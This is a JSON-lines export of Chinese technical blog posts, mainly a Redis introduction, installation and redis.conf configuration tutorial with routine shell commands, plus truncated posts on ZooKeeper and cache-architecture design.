（2）是先操纵数据库中的数据再操纵缓存中的数据，还是先操纵缓存中的数据再操纵数据库中的数据呢？<br>\n　　（3）缓存与数据库的操作，在架构上是否有优化的空间呢？<br><br>\n　　这是本文关注的三个核心问题。<br><br><strong></strong></p>                                    </div>", "log_PostTime": 1584891296, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Redis安装与配置(更新时间2020.02.23)", "log_Intro": "Redis安装与配置(更新时间2020.02.23)", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p> </p>\n\n<h3><strong>Redis 简介</strong></h3>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRTE5NUNGMDc0QUM2NjQwNjRBNkZGMDhGNDI5MzNDMUYzLzYxMzg?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p>Redis 是完全开源免费的，遵守BSD协议，是一个高性能(NOSQL)的key-value数据库,Redis是一个开源的使用ANSI <a href=\"https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80\" rel=\"nofollow\">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93\" rel=\"nofollow\">数据库</a>，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。(Vmware在资助着redis项目的开发和维护)</p>\n\n<p> </p>\n\n<p><a href=\"https://baike.baidu.com/item/BSD\" rel=\"nofollow\">BSD</a>是\"Berkeley Software Distribution\"的缩写，意思是\"伯克利软件发行版\"。</p>\n\n<p>BSD开源协议是一个给于使用者很大自由的协议。可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。BSD代码鼓励代码共享，但需要尊重代码作者的著作权。BSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。</p>\n\n<p> </p>\n\n<h3>Redis作者</h3>\n\n<p>redis的作者，他叫Salvatore Sanfilippo，来自意大利的西西里岛，现在居住在卡塔尼亚。目前供职于Pivotal公司。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRUE5QkNBQUE0OENFNjQwQkI5NzkzNDdDODU0REVBNERCLzYxMzk?x-oss-process=image/format,png\"></p>\n\n<p>地址是antirez.com，当然也可以去follow他的github，地址是http://github.com/antirez。</p>\n\n<h3>NoSQL介绍</h3>\n\n<p>NoSQL，泛指非关系型的数据库。随着互联网web2.0网站的兴起，传统的关系数据库在应付web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，暴露了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。NoSQL数据库的产生就是为了解决大规模数据集合多重数据种类带来的挑战，尤其是大数据应用难题。</p>\n\n<p> </p>\n\n<p>NoSQL数据库的四大分类</p>\n\n<p>键值(<a href=\"https://baike.baidu.com/item/Key-Value\" rel=\"nofollow\">Key-Value</a>)存储数据库 这一类数据库主要会使用到一个哈希表，这个表中有一个特定的键和一个指针指向特定的数据。Key/value模型对于IT系统来说的优势在于简单、易部署。但是如果DBA只对部分值进行查询或更新的时候，Key/value就显得效率低下了。[3] 举例如：Tokyo Cabinet/Tyrant, Redis, Voldemort, Oracle BDB. 列存储数据库 这部分数据库通常是用来应对分布式存储的海量数据。键仍然存在，但是它们的特点是指向了多个列。这些列是由列家族来安排的。如：Cassandra, HBase, Riak. 文档型数据库 文档型数据库的灵感是来自于Lotus Notes办公软件的，而且它同第一种键值存储相类似。该类型的数据模型是版本化的文档，半结构化的文档以特定的格式存储，比如JSON。文档型数据库可 以看作是键值数据库的升级版，允许之间嵌套键值。而且文档型数据库比键值数据库的查询效率更高。如：CouchDB, MongoDb. 国内也有文档型数据库SequoiaDB，已经开源。 图形(Graph)数据库 图形结构的数据库同其他行列以及刚性结构的SQL数据库不同，它是使用灵活的图形模型，并且能够扩展到多个服务器上。NoSQL数据库没有标准的查询语言(SQL)，因此进行数据库查询需要制定数据模型。许多NoSQL数据库都有REST式的数据接口或者查询API。[2] 如：Neo4J, InfoGrid, Infinite Graph. 因此，我们总结NoSQL数据库在以下的这几种情况下比较适用：1、数据模型比较简单；2、需要灵活性更强的IT系统；3、对数据库性能要求较高；4、不需要高度的数据一致性；5、对于给定key，比较容易映射复杂值的环境。</p>\n\n<p> </p>\n\n<p> </p>\n\n<p>Redis 与其他 key - value 缓存产品有以下三个特点：</p>\n\n<ul><li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>\n\t<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>\n\t<li>Redis支持数据的备份，集群等高可用功能。</li>\n</ul><p> </p>\n\n<p> </p>\n\n<p>特点:</p>\n\n<ul><li>性能极高 – Redis能读的速度是110000次/s,写的速度是81000次/s 。</li>\n\t<li>丰富的数据类型 – Redis支持的类型 String, List, Hash, Set 及 Ordered Set 数据类型操作。</li>\n\t<li>原子 – Redis的所有操作都是原子性的，意思就是要么成功执行要么失败完全不执行。单个操作是原子性的。多个操作也支持事务，即原子性，通过MULTI和EXEC指令包起来。</li>\n\t<li>丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。</li>\n</ul><p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p>Redis是一个简单的，高效的，分布式的，基于内存的缓存工具。 架设好服务器后，通过网络连接（类似数据库），提供Key－Value式缓存服务。</p>\n\n<p>简单，是Redis突出的特色。 简单可以保证核心功能的稳定和优异。</p>\n\n<p> </p>\n\n<h3>Redis总结</h3>\n\n<p>redis单个key 存入512M大小</p>\n\n<p>redis支持多种类型的数据结构(string,list,hash.set.zset)</p>\n\n<p>redis 是单线程 原子性</p>\n\n<p>redis可以持久化 因为使用了 RDB和AOF机制</p>\n\n<p>redis支持集群 而且redis 支持库(0-15) 16个库</p>\n\n<p>redis 还可以做消息队列 比如聊天室 IM</p>\n\n<p> </p>\n\n<p>企业级开发中:可以用作数据库、缓存(热点数据（经常会被查询，但是不经常被修改或者删除的数据)和消息中间件等大部分功能。</p>\n\n<p> </p>\n\n<p>优点： 1. 丰富的数据结构</p>\n\n<p>2.高速读写，redis使用自己实现的分离器，代码量很短，没有使用lock（MySQL），因此效率非常高。</p>\n\n<p> </p>\n\n<p>缺点： 1. 持久化。Redis直接将数据存储到内存中，要将数据保存到磁盘上，Redis可以使用两种方式实现持久化过程。定时快照（snapshot）：每隔一段时间将整个数据库写到磁盘上，每次均是写全部数据，代价非常高。第二种方式基于语句追加（aof）：只追踪变化的数据，但是追加的log可能过大，同时所有的操作均重新执行一遍，回复速度慢。 2. 耗内存，占用内存过高。</p>\n\n<p> </p>\n\n<p> </p>\n\n<p>Redis安装</p>\n\n<p>Windows安装</p>\n\n<p><a href=\"https://jingyan.baidu.com/article/0f5fb099045b056d8334ea97.html\" rel=\"nofollow\">https://jingyan.baidu.com/article/0f5fb099045b056d8334ea97.html</a></p>\n\n<p>Linux安装</p>\n\n<p>安装Redis</p>\n\n<p>官方网站：http://redis.io/</p>\n\n<p>官方下载：http://redis.io/download 可以根据需要下载不同版本</p>\n\n<p>（域名后缀io属于国家域名，是british Indian Ocean territory，即英属印度洋领地）</p>\n\n<h3>Redis安装</h3>\n\n<p>Redis是C语言开发，安装Redis需要先将官网下载的源码进行编译，编译依赖gcc环境，如果没有gcc环境，需要安装gcc</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRTYzOUEzQkVCQ0ExOTRBOTg4NTBBNkNGNzRDOERBRkEzLzYxNDA?x-oss-process=image/format,png\"></p>\n\n<p>安装gcc</p>\n\n<p>gcc的安装很简单，首先要确保root登录，其次就是Linux要能连外网</p>\n\n<pre>\n<code>\nyum -y install gcc automake autoconf libtool make</code></pre>\n\n<p>注意：运行yum时出现/var/run/yum.pid已被锁定,PID为xxxx的另一个程序正在运行的问题解决</p>\n\n<pre>\n<code>\nrm -f /var/run/yum.pid</code></pre>\n\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p> </p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p> </p>\n\n<h3>安装Redis</h3>\n\n<p>命令1：</p>\n\n<pre>\n<code>wget http://download.redis.io/releases/redis-5.0.7.tar.gz</code></pre>\n\n<p>命令2：</p>\n\n<pre>\n<code>tar xzf redis-5.0.7.tar.gz</code></pre>\n\n<p>命令3：</p>\n\n<pre>\n<code>cd redis-5.0.7</code></pre>\n\n<p>命令4（编译）：</p>\n\n<pre>\n<code>make 或 make MALLOC=libc</code></pre>\n\n<p>如下图代表成功：</p>\n\n<p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20200223224645262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>命令5：make PREFIX=/usr/local/redis install</p>\n\n<p>（安装编译后的文件） 安装到指目录：</p>\n\n<p>注意：PREFIX必须大写、同时会自动为我们创建redis目录，并将结果安装此目录</p>\n\n<p> </p>\n\n<p>命令6： cd /usr/local/redis 查看</p>\n\n<p>命令7：查看bin目录下，如图：</p>\n\n<p><img alt=\"\" height=\"177\" src=\"https://img-blog.csdnimg.cn/20200223224902661.png\" width=\"532\"></p>\n\n<p> </p>\n\n<h3>Redis启动</h3>\n\n<p>启动Redis服务</p>\n\n<p>进入对应的安装目录 /usr/local/redis</p>\n\n<p>执行命令： ./bin/redis-server</p>\n\n<p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20200223225111869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>启动Redis客户端</p>\n\n<p>进入Redis客服端（Clone Session克隆一个窗口）：</p>\n\n<p>进入对应的安装目录 cd /usr/local/redis</p>\n\n<p>执行命令： ./bin/redis-cli</p>\n\n<p><img alt=\"\" height=\"164\" src=\"https://img-blog.csdnimg.cn/20200223225330429.png\" width=\"406\"></p>\n\n<p>启动Redis 客户端命令：</p>\n\n<pre>\n<code>redis-cli –h IP地址 –p 端口\n\n退出客户端命令：Ctrl+C</code></pre>\n\n<p>检测是否服务端启动</p>\n\n<p>启动 redis 客户端，打开终端并输入命令 redis-cli。该命令会连接本地的 redis 服务。</p>\n\n<pre>\n<code>$redis-cli\n\nredis 127.0.0.1:6379&gt;\n\nredis 127.0.0.1:6379&gt; PING\n\nPONG</code></pre>\n\n<p>在以上实例中我们连接到本地的 redis 服务并执行 PING 命令，该命令用于检测 redis 服务是否启动。</p>\n\n<p>Linux配置Redis</p>\n\n<p>Redis 的配置文件位于 Redis 安装目录下，文件名为 redis.conf(Windows 名为 redis.windows.conf)。</p>\n\n<h3>配置Redis</h3>\n\n<p>Redis端口号或启动有默认配置。但一般我们都会通过手动配置完成</p>\n\n<p>回到根目录找到解压文件中的reids.conf</p>\n\n<p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20200223225941846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>命令：cp redis.conf /usr/local/redis 将配置文件复制到安装文件的目录下</p>\n\n<p>Redis配置至此全部完成</p>\n\n<p>redis.conf 配置文件详解</p>\n\n<p>redis.conf 配置项说明如下：</p>\n\n<p>1. Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程</p>\n\n<p>daemonize no</p>\n\n<p>2. 当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定</p>\n\n<p>pidfile /var/run/redis.pid</p>\n\n<p>3. 指定Redis监听端口，默认端口为6379，为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字</p>\n\n<p>port 6379</p>\n\n<p>4. 绑定的主机地址</p>\n\n<p>bind 127.0.0.1</p>\n\n<p>5.当 客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能</p>\n\n<p>timeout 300</p>\n\n<p>6. 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose</p>\n\n<p>loglevel verbose</p>\n\n<p>7. 日志记录方式，默认为标准输出，如果配置Redis为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给/dev/null</p>\n\n<p>logfile stdout</p>\n\n<p>8. 设置数据库的数量，默认数据库为0，可以使用SELECT &lt;dbid&gt;命令在连接上指定数据库id</p>\n\n<p>databases 16</p>\n\n<p>9. 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合</p>\n\n<p>save &lt;seconds&gt; &lt;changes&gt;</p>\n\n<p>Redis默认配置文件中提供了三个条件：</p>\n\n<p>save 900 1</p>\n\n<p>save 300 10</p>\n\n<p>save 60 10000</p>\n\n<p>分别表示900秒（15分钟）内有1个更改，300秒（5分钟）内有10个更改以及60秒内有10000个更改。</p>\n\n<p>10. 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大</p>\n\n<p>rdbcompression yes</p>\n\n<p>11. 指定本地数据库文件名，默认值为dump.rdb</p>\n\n<p>dbfilename dump.rdb</p>\n\n<p>12. 指定本地数据库存放目录</p>\n\n<p>dir ./</p>\n\n<p>13. 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步</p>\n\n<p>slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n\n<p>14. 当master服务设置了密码保护时，slav服务连接master的密码</p>\n\n<p>masterauth &lt;master-password&gt;</p>\n\n<p>15. 设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH &lt;password&gt;命令提供密码，默认关闭</p>\n\n<p>requirepass foobared</p>\n\n<p>16. 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息</p>\n\n<p>maxclients 128</p>\n\n<p>17. 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，当此方法处理 后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis新的vm机制，会把Key存放内存，Value会存放在swap区</p>\n\n<p>maxmemory &lt;bytes&gt;</p>\n\n<p>18. 指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no</p>\n\n<p>appendonly no</p>\n\n<p>19. 指定更新日志文件名，默认为appendonly.aof</p>\n\n<p>appendfilename appendonly.aof</p>\n\n<p>20. 指定更新日志条件，共有3个可选值： no：表示等操作系统进行数据缓存同步到磁盘（快） always：表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全） everysec：表示每秒同步一次（折中，默认值）</p>\n\n<p>appendfsync everysec</p>\n\n<p>21. 指定是否启用虚拟内存机制，默认值为no，简单的介绍一下，VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中（在后面的文章我会仔细分析Redis的VM机制）</p>\n\n<p>vm-enabled no</p>\n\n<p>22. 虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享</p>\n\n<p>vm-swap-file /tmp/redis.swap</p>\n\n<p>23. 将所有大于vm-max-memory的数据存入虚拟内存,无论vm-max-memory设置多小,所有索引数据都是内存存储的(Redis的索引数据 就是keys),也就是说,当vm-max-memory设置为0的时候,其实是所有value都存在于磁盘。默认值为0</p>\n\n<p>vm-max-memory 0</p>\n\n<p>24. Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的 数据大小来设定的，作者建议如果存储很多小对象，page大小最好设置为32或者64bytes；如果存储很大大对象，则可以使用更大的page，如果不 确定，就使用默认值</p>\n\n<p>vm-page-size 32</p>\n\n<p>25. 设置swap文件中的page数量，由于页表（一种表示页面空闲或使用的bitmap）是在放在内存中的，，在磁盘上每8个pages将消耗1byte的内存。</p>\n\n<p>vm-pages 134217728</p>\n\n<p>26. 设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4</p>\n\n<p>vm-max-threads 4</p>\n\n<p>27. 设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启</p>\n\n<p>glueoutputbuf yes</p>\n\n<p>28. 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法</p>\n\n<p>hash-max-zipmap-entries 64</p>\n\n<p>hash-max-zipmap-value 512</p>\n\n<p>29. 指定是否激活重置哈希，默认为开启（后面在介绍Redis的哈希算法时具体介绍）</p>\n\n<p>activerehashing yes</p>\n\n<p>30. 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件</p>\n\n<p>include /path/to/local.conf</p>\n\n<p> </p>\n\n<p>Redis中的内存维护策略</p>\n\n<p> </p>\n\n<p>redis作为优秀的中间缓存件，时常会存储大量的数据，即使采取了集群部署来动态扩容，也应该即使的整理内存，维持系统性能。</p>\n\n<p> </p>\n\n<p>在redis中有两种解决方案，</p>\n\n<p>一是为数据设置超时时间，</p>\n\n<p> </p>\n\n<p>二是采用LRU算法动态将不用的数据删除。内存管理的一种页面置换算法，对于在内存中但又不用的数据块（内存块）叫做LRU，操作系统会根据哪些数据属于LRU而将其移出内存而腾出空间来加载另外的数据。</p>\n\n<p>1.volatile-lru：设定超时时间的数据中,删除最不常使用的数据.</p>\n\n<p> </p>\n\n<p>2.allkeys-lru：查询所有的key中最近最不常使用的数据进行删除，这是应用最广泛的策略.</p>\n\n<p> </p>\n\n<p>3.volatile-random：在已经设定了超时的数据中随机删除.</p>\n\n<p> </p>\n\n<p>4.allkeys-random：查询所有的key,之后随机删除.</p>\n\n<p> </p>\n\n<p>5.volatile-ttl：查询全部设定超时时间的数据,之后排序,将马上将要过期的数据进行删除操作.</p>\n\n<p> </p>\n\n<p>6.noeviction：如果设置为该属性,则不会进行删除操作,如果内存溢出则报错返回.</p>\n\n<ul><li>volatile-lfu：从所有配置了过期时间的键中驱逐使用频率最少的键</li>\n\t<li>allkeys-lfu：从所有键中驱逐使用频率最少的键</li>\n</ul><p><a href=\"https://www.jianshu.com/p/c8aeb3eee6bc\" rel=\"nofollow\">https://www.jianshu.com/p/c8aeb3eee6bc</a></p>\n\n<p>自定义配置Redis</p>\n\n<p> </p>\n\n<p>1、进入对应的安装目录 /usr/local/redis</p>\n\n<p>修改 redis.conf 配置文件 vim redis.conf (进入命令模式 通过/内容 查找相应字符串）</p>\n\n<p> </p>\n\n<p>2、Redis配置默认必须修改：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRTc4N0M5Qzg5OTk3QjQ1NDdBQzkxMUY3MDNFQzUwRkM0LzYxNDc?x-oss-process=image/format,png\"></p>\n\n<p>daemonize no 修改为 daemonize yes</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRUM5NzFGRjU5MUQ3QjRCMDNBMzIzOTIyMjZBNzEzQjJBLzYxNDk?x-oss-process=image/format,png\"></p>\n\n<p>bind 127.0.01 注释掉</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRUNCMTc4MDI5MUI5NDRBMkI4QThGN0FFOEQ1MzgyNUU3LzYxNTA?x-oss-process=image/format,png\"></p>\n\n<p>requirepass 设置密码</p>\n\n<p> </p>\n\n<p>Redis采用的是单进程多线程的模式。当redis.conf中选项daemonize设置成yes时，代表开启守护进程模式。在该模式下，redis会在后台运行，并将进程pid号写入至redis.conf选项pidfile设置的文件中，此时redis将一直运行，除非手动kill该进程。但当daemonize选项设置成no时，当前界面将进入redis的命令行界面，exit强制退出或者关闭连接工具(putty,xshell等)都会导致redis进程退出。 服务端开发的大部分应用都是采用后台运行的模式</p>\n\n<p> </p>\n\n<p>Redis启动：</p>\n\n<p>服务端启动：</p>\n\n<p>./bin/redis-server ./redis.conf</p>\n\n<p> </p>\n\n<p>客户端启动：</p>\n\n<p>本地客户端登录</p>\n\n<p>用redis-cli 密码登陆（redis-cli -a password）</p>\n\n<p> </p>\n\n<p>远程服务上执行命令</p>\n\n<p>如果需要在远程 redis 服务上执行命令，同样我们使用的也是 redis-cli 命令。</p>\n\n<p> </p>\n\n<p>语法：</p>\n\n<p> </p>\n\n<p>redis-cli -h host -p port -a password</p>\n\n<p>redis-cli –h IP地址 –p 端口 –a 密码</p>\n\n<p> </p>\n\n<p> </p>\n\n<p>Redis关闭</p>\n\n<p>第一种关闭方式：（断电、非正常关闭。容易数据丢失）</p>\n\n<p>查询PID ps -ef | grep -i redis</p>\n\n<p>kill -9 PID</p>\n\n<p> </p>\n\n<p>第二种关闭方式（正常关闭、数据保存）</p>\n\n<p>./bin/redis-cli shutdown 关闭redis服务，通过客户端进行shutdown</p>\n\n<p> </p>\n\n<p>如果redis设置了密码，需要先在客户端通过密码登录，再进行shutdown即可关闭服务端</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRUM2OTEzQ0I5QTYxMDQyRThCQURFNTNFMjM1OTZDOTdGLzYxNTE?x-oss-process=image/format,png\"></p>\n\n<p>通过 ps –ef | grep –i redis 查看当前进程：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9iZmNjNDc4NTQ3YzkyMDkyNjE0NjY3NWU2NzhlNGExZi94bWxub3RlL09GRklDRTMzQzY1RkNDRDM1RDQxQjZCNjhEMTkwMjZFM0MwMEEwLzYxNTI?x-oss-process=image/format,png\"></p>\n                                    </div>", "log_PostTime": 1584891297, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "zookeeper原理特点案例", "log_Intro": "zookeeper原理特点案例", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>ZooKeeper是一个<a href=\"https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F/19276232\">分布式</a>的，开放源码的<a href=\"https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/9854429\">分布式应用程序</a>协调服务，是<a href=\"https://baike.baidu.com/item/Google\">Google</a>的Chubby一个<a href=\"https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/246339\">开源</a>的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>\n\n<p>ZooKeeper的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。</p>\n\n<p>ZooKeeper包含一个简单的原语集，提供Java和C的接口。</p>\n\n<p>ZooKeeper代码版本中，提供了分布式独享锁、选举、队列的接口，代码在$zookeeper_home\\src\\recipes。其中分布锁和队列有<a href=\"https://baike.baidu.com/item/Java/85979\">Java</a>和C两个版本，选举只有Java版本。</p>\n\n<h2>原理</h2>\n\n<p>ZooKeeper是以Fast Paxos算法为基础的，<a href=\"https://baike.baidu.com/item/Paxos%20%E7%AE%97%E6%B3%95\">Paxos 算法</a>存在<a href=\"https://baike.baidu.com/item/%E6%B4%BB%E9%94%81\">活</a></p>                                    </div>", "log_PostTime": 1584891298, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "最全面的缓存架构设计", "log_Intro": "最全面的缓存架构设计", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>一、缓存技术和框架的重要性</h3>\n\n<p>互联网的一些高并发，高性能的项目和系统中，缓存技术是起着功不可没的作用。缓存不仅仅是key-value的简单存取，它在具体的业务场景中，还是很复杂的，需要很强的架构设计能力。我曾经就遇到过因为缓存架构设计不到位，导致了系统崩溃的案例。</p>\n\n<h3>二、缓存的技术方案分类</h3>\n\n<p>1）是做实时性比较高的那块数据，比如说库存，销量之类的这种数据，我们采取的实时的缓存+数据库双写的技术方案，双写一致性保障的方案。</p>\n\n<p>2）是做实时性要求不高的数据，比如说商品的基本信息，等等，我们采取的是三级缓存架构的技术方案，就是说由一个专门的数据生产的服务，去获取整个商品详情页需要的各种数据，经过处理后，将数据放入各级缓存中。</p>\n\n<h3>三、高并发以及高可用的复杂系统中的缓存架构都有哪些东西</h3>\n\n<p>1）在大型的缓存架构中，redis是最最基础的一层。高并发，缓存架构中除了redis，还有其他的组成部分，但是redis至关重要。</p>\n\n<ul><li>\n\t<p>如果你的数据量不大（10G以内），单master就可以。redis持久化+备份方案+容灾方案+replication（主从+读写分离）+sentinal（哨兵集群，3个节点，高可用性）</p>\n\t</li>\n\t<li>\n\t<p>如果你的数据量很大（1T+），采用redis cluster。多master分布式存储数据，水平扩容,自动进行master -&gt; slave的主备切换。</p>\n\t</li>\n</ul><p>2）最经典的缓存+数据库读写的模式，<strong>cache aside pattern</strong>。读的时候，先读缓存，缓存没有的话，那么就读数据库。更新缓存分以下两种方式：</p>\n\n<ul><li>\n\t<p>数据发生变化时，先更新缓存，然后再更新数据库。这种适用于缓存的值相对简单，和数据库的值一一对应，这样更新比较快。</p>\n\t</li>\n\t<li>\n\t<p>数据发生变化时，先删除缓存，然后再更新数据库，读数据的时候再设置缓存。这种适用于缓存的值比较复杂的场景。比如可能更新了某个表的一个字段，然后其对应的缓存，是需要查询另外两个表的数据，并进行运算，才能计算出缓存最新的值的。这样更新缓存的代价</p></li></ul>                                    </div>", "log_PostTime": 1584891299, "log_Meta": ""}
